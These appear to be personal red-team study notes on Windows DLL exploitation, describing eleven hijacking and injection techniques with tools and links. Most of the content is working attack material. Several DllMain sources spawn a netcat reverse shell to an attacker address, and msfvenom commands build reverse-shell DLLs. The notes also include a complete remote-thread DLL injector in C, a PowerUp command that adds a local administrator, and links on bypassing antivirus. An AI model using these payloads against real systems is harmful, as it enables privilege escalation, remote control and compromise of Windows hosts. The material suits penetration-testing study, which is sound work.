DLL Exploitation:
================
Continue research from here:
	https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/PrivescPostEx.md
Links:
	https://insert-script.blogspot.com/2018/05/dll-hijacking-via-url-files.html
	https://posts.specterops.io/lateral-movement-scm-and-dll-hijacking-primer-d2f61e8ab992
	https://idiotc4t.com/code-and-dll-process-injection/dll-hollowing
	https://resources.infosecinstitute.com/topic/code-injection-types-part-1/
	https://alparslanakyildiz.medium.com/understanding-and-detecting-dll-1nj3ct0n-process-hollowing-fcd87676d36b
	https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
	https://github.com/forrest-orr/phantom-dll-hollower-poc
	Videos:
		Watch "4. Execution flow hijacking/ 5. Library Has Fallen - DLL Hijacking" video of Privilege Escalation in Windows course by Sektor7 Red Team Operator
Basics:
	DLL:(Dynamic Link Library)
		Read Windows Internals Sheet to read basics of DLL
	DLL Hijacking:
		It refers to tricking a legitimate/trusted application into loading an arbitrary DLL.
		Applications load external code via DLLs (Dynamic Link Libraries). So, by exploiting DLLs, we exploit the application.
		In Windows, a service-based application load many DLLs when it starts in order to function properly.
	Note:
		Terms such as DLL Search Order Hijacking, DLL Load Order Hijacking, DLL Spoofing, DLL Injection and DLL Side-Loading are often "mistakenly" used to say the same.
		These terms describe specific cases of DLL hijacking, but are often used interchangeably and therefore incorrectly.
Types of DLL Exploitation:(11 Types)
	1. DLL Search Order Hijacking:(aka DLL Load-Order Hijacking)
		Basics:
			DLLs specified by an application without a path are searched for in fixed locations in a specific order.
			Hijacking the search order takes place by putting the malc.dll in a location that is searched in before the actual DLL. This sometimes includes the working directory of the target application.
		Enumeration:
			Step-1: Finding DLL to hijack:
				PrivescCheck.ps1/powerup.ps1
				Using Find-ProcessDLLHijack:(module of powersploit's powerup.ps1)
					Find-ProcessDLLHijack => Finds all DLL hijack locations for currently running processes.
					Find-ProcessDLLHijack -ExcludeOwned => Finds possible hijackable DLL location for processes not owned by the current user.
					Get-Process VulnProcess | Find-ProcessDLLHijack => Finds possible hijackable DLL locations for the 'VulnProcess' processes.	
			Step-2: Finding a place to put malc.dll:
				Factors to consider:
					A. DLL Search Order:(where is .DLL going to be searched)
						Generally, a Windows application will use pre-defined search paths to find DLL's and it will check these paths in a specific order.	
							directory of program
							c:\windows\system32
							c:\windows\system
							c:\windows
							current working directory
							Directories in the system PATH environment variable
							Directories in the user PATH environment variable
								C:\>path => to see PATH variable
						DLL hijacking usually happens by placing a malicious DLL in one of these paths while making sure that DLL is found before the legitimate one.
					B. Folder Permission:
						1. accesschk.exe /accepteula -udqv "C:\Program Files"
						2. cacls "C:\temp"
							Note:
								to read more about cacls => read important CMD tools section
						3. Check permissions of all folders inside PATH:
							a. Find-PathDLLHijack:(module of powersploit's powerup.ps1) => Finds all directories in the system %PATH% that are modifiable by the current user.
							b. for %A in ("%path:;=";"%") do ( CMD.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
							c. for %A in ("%path:;=";"%") do ( powershell.exe -c Get-Acl )
		Exploitation:(2 Steps)
			Step-1: Write DLL:(2 ways)
				A. Automated DLL Creation and Write:
					Write-HijackDll:(Module of PowerUp.ps1)
						Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.DLL' 
							adds malc.dll at 'C:\Temp\wlbsctrl.DLL' which adds a user (john:Password123!) to local administrators group
				B. Manual DLL Creation and Write:(2 Steps)
					1. Creating malc.dll:(2 Ways)
						A. Msfvenom:
							msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f DLL -o malc.dll
						B. Manual DLL:(4 Ways)
							Manual DLL-1:(Tested in Win10)
								Code:
									#include <windows.h>
									BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
									    switch(dwReason){
									        case DLL_PROCESS_ATTACH:
									            system("whoami > C:\\users\\username\\whoami.txt");
									            WinExec("//my_ip/abcd/nc.exe -e powershell.exe my_ip 443", 0);
									            break;
									        case DLL_PROCESS_DETACH:
									            break;
									        case DLL_THREAD_ATTACH:
									            break;
									        case DLL_THREAD_DETACH:
									            break;
									    }
									    return TRUE;
									}			
								Usage:
									i686-w64-mingw32-g++ DLL.c -lws2_32 -o malc.dll -shared
							Manual DLL-2:
								Code:
									#include <windows.h>
									BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
									    if (dwReason == DLL_PROCESS_ATTACH){
									        system("cmd.exe /c //my_ip/abcd/nc.exe -e powershell.exe my_ip 443");
									        ExitProcess(0);
									    }
									    return TRUE;
									}			
								Usage:
									x86_64-w64-mingw32-gcc windows_dll.c -shared -o malc.dll => For x64
									i686-w64-mingw32-gcc windows_dll.c -shared -o malc.dll => For x86
							Manual DLL-3:
								Code:
									#include <windows.h>
									int owned()
									{
									  WinExec("cmd.exe /c //my_ip/abcd/nc.exe -e powershell.exe my_ip 443", 0);
									  exit(0);
									  return 0;
									}
									BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
									{
									  owned();
									  return 0;
									}			
								Usage:
									x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
									x86_64-w64-mingw32-g++ -shared -o main.DLL main.o -Wl,--out-implib,main.a
							Manual DLL-4:
								Code:
									#include<windows.h>
									#include<stdlib.h>
									#include<stdio.h>
									void Entry (){ //Default function that is executed when the DLL is loaded
									    system("cmd");
									}
									BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
									    switch (ul_reason_for_call){
									        case DLL_PROCESS_ATTACH:
									            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
									            break;
									        case DLL_THREAD_ATTACH:
									        case DLL_THREAD_DETACH:
									        case DLL_PROCESS_DEATCH:
									            break;
									    }
									    return TRUE;
									}			
								Usage:
									i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o malc.dll
					2. Transfer malc.dll to victim:
			Step-2: Execute DLL:(2 ways)
				A. If we have attacked a service:
					Restart the service => explained above
				B. If we have attacked an application:
					wait for the application.exe to attempt to load malc.dll
		Note:
			Special Types:
				A. DLL Replacement:
					Basics:
						Its a special case of "DLL Search Order Hijacking", in which we have insecure folder permissions in directory of legitimate.dll. So, we replace legitimate.dll with malc.dll
				B. DLL PreLoading:(aka Binary Planting Attacks)
					Basics:
						Placing malc.dll as legitimate.dll in a location that Windows searches before main directory of executable.
	2. DLL Replacement:
		Read "DLL Search Order Hijacking" Section
	3. DLL PreLoading:
		Read "DLL Search Order Hijacking" Section
	4. DLL Redirection:
		Basics:	
			change the location in which the DLL is searched for, e.g. by editing the %PATH% environment variable, or .exe.manifest / .exe.local files to include the folder containing malc.dll
	5. DLL Proxying:(aka DLL Proxy Loading)
		Basics:
			It is a type of MITM Attack.
			We rename legitimate.dll as temp.dll and place malc.dll as legitimate.dll
			Malc.dll implemts the functions which the attacker wants to intercept/modify, while forwarding all other functions to legitimate.dll, thus the name "DLL Proxying".
			Overview:(6 Steps)
				1. Analyze the original DLL, from here referred to as “target DLL”
				2. Identify functions to intercept/modify
				3. Implement intercepted functions in Trojan DLL
				4. Forward all other functions to the target DLL (the original DLL)
				5. Rename the target DLL
				6. Place Trojan DLL with original name of target DLL		
		Exploitation:(2 Steps)
			Step-1: Enumeration:
				Find the target executable:
					1. Size < 10 MB
					2. It should has a signature.
					3. Loads less than 4 Dlls at runtime
			Step-2: Creating malc.dll:(2 Steps)
				1. Creating shellcode.bin:(2 Ways)
					A. msfvenom:
						msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
					B. Using executable from msfvenom/C2 agents converted to shellcode:
						Using Donut.exe:(https://github.com/TheWover/donut)
							.\donut.exe agent.exe => gives loader.bin
							Note:
								To read more, see Windows Privesc
				2. Creating malc.c using SharpDllProxy.exe:(https://github.com/Flangvik/SharpDllProxy)
					Basics:
						This will give us malc.c
					Usage:
						./SharpDllProxy.exe --dll legitimate.dll --payload shellcode.bin
						Flags:
							--dll => legitimate.dll
							--payload => shellcode.bin
				3. Creating malc.dll:
	6. Phantom DLL Hijacking:
		Basics:	
			Placing malc.dll in place of a missing/non-existing DLL that a legitimate application tries to load
	7. Relative Path DLL Hijacking:
		Basics:
			Instead of copying malc.dll, we copy (and optionally rename) the legitimate application to a user-writeable folder, alongside the malc.dll
		https://github.com/wietze/windows-dll-hijacking
	8. DLL Hooking:(aka WinAPI Hooking)
		Basics:	
			Its where an application takes over the entry points of a DLL so that it can intercept API calls.
	9. DLL Injection:
		Basics:
			DLL injection is the act of loading a dynamic link library into an external process, from your own process.
			We do DLL injection when we do not have folder permissions for target application.
			Working:(4 Steps)
				1. Attach to the process
				2. Allocate Memory within the process
				3. Copy the DLL or the DLL Path into the processes memory and determine appropriate memory addresses
				4. Instruct the process to Execute your DLL
		Types:(2)
			A. Disk-based DLL Injection:
				Basics:
				Exploitation:(2 Steps)
					1. Create malc.dll:
						msfvenom:
					2. Inject malc.dll:(2 Ways)
						A. Via Executable:(2 Ways)
							1. dllinjector.exe:
								Code:
									#include <windows.h>
									#include <stdio.h>
									int main(int argc, char* argv[]) {
										HANDLE processHandle;
										PVOID remoteBuffer;
										wchar_t dllPath[] = TEXT("C:\\temp\\malc.dll");
										printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
										processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
										remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
										WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
										PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
										CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
										CloseHandle(processHandle);
										return 0;
									}
								Usage:	
									dll-injector.exe <PID>
							2. RemoteDLLInjector64.exe:
								Code:
								Usage:
									RemoteDLLInjector64.exe 1234 C:\malc.dll
						B. Via Powershell Script:
							Invoke-DLLInjection:
								Invoke-DLLInjection -ProcessID 1234 C:\malc.dll
			B. Memory-based DLL Injection:(aka Reflective DLL Injection)(aka DLL Reflection)
				Basics:	
					In this method, we inject a DLL into a victim process from memory rather than disk using WinAPI's LoadLibrary() function
					Issue:
						LoadLibrary() does not support loading a DLL from memory
						So, Attackers who choose to use this technique must write their own version of the API that does not rely on a disk-based DLL.
				Exploitation:
					Invoke-ReflectivePEInjection.ps1
	10. DLL Spoofing:
	11. DLL Side-Loading:(aka WinSxS DLL Replacement)
		Basics:
			Replacing legitimate.dll with malc.dll in the "relevant" WinSxS folder of the targeted DLL.
			WinSxS:
				WinSxS stands for "Windows Side by Side"
				WinSxS is a system folder in Windows. That’s why it’s located on the system partition.		
		https://flangvik.com/privesc/windows/bypass/2019/06/25/Sideload-like-your-an-APT.html
		https://flangvik.com/2019/07/24/Bypassing-AV-DLL-Side-Loading.html	
	Note:
		DLL Search Order Hijacking v/s DLL Redirection:
			In "DLL Search Order Hijacking", we place malc.dll in a insecure folder listed in %PATH% variable.
			In "DLL Redirection", we edit %PATH% variable	
Creating DLL Payloads:
	Types:
		x86:
			Creating it:
				msfvenom -p windows/shell_reverse_tcp -f DLL LHOST=192.168.178.15 LPORT=4444 > shell.DLL
			Usage:
				CMD> C:/Windows/SysWOW64/rundll.exe shell.DLL,abcd
			Note:
				we need to pass a random value along with shell.DLL in order for it to work
		x64:
			Creating it:
				msfvenom -p windows/x64/shell_reverse_tcp -f DLL LHOST=192.168.178.15 LPORT=4444 > shell.DLL
			Usage:
				1.CMD>C:/Windows/System32/rundll.exe shell.DLL,abcd
				2.CMD>C:/Windows/SysWOW64/rundll.exe shell.DLL,abcd
			Note:
				we need to pass a random value along with shell.DLL in order for it to work	
Tools:
	procmon.exe:(GUI)
		Read Windows Internals Sheet
	GenDLL.py:(https://github.com/Mr-Un1k0d3r/DLLsForHackers)
		Basics:
		Usage:
			python3 GenDll.py -t dropexec --com "C:\Program Files\mingw-w64\x86_64-8.1.0-win32-seh-rt_v6-rev0\mingw64\bin\x86_64-w64-mingw32-g++.exe" --payload binary.exe
			Flags:
				--com => compile malc.c to malc.dll using the specified compiler 
				-c => command to run
				-t => payload type:
					exec:
					dropexec:
	Get-PotentialDLLHijack.ps1:(https://github.com/slyd0g/DLLHijackTest)
		https://posts.specterops.io/automating-dll-hijack-discovery-81c4295904b0
	https://github.com/cys3c/Siofra
	https://github.com/cyberark/DLLSpy
	https://github.com/MojtabaTajik/Robber
	https://github.com/monoxgas/Koppeling
	https://github.com/jfmaes/TrustJack